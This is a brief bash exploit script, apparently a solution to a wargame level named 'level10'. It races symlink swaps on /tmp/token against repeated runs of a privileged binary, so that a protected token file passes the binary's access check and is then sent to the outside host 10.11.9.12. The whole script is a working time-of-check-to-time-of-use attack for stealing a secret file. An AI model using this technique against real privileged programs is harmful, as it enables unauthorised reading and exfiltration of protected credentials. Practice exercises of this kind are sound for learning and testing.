#!/bin/bash
touch /tmp/test
while true ; do ln -sf /home/user/level10/token /tmp/token ; ln -sf /tmp/test /tmp/token ; done &
while true ; do /home/user/level10/level10 /tmp/token 10.11.9.12 ; done
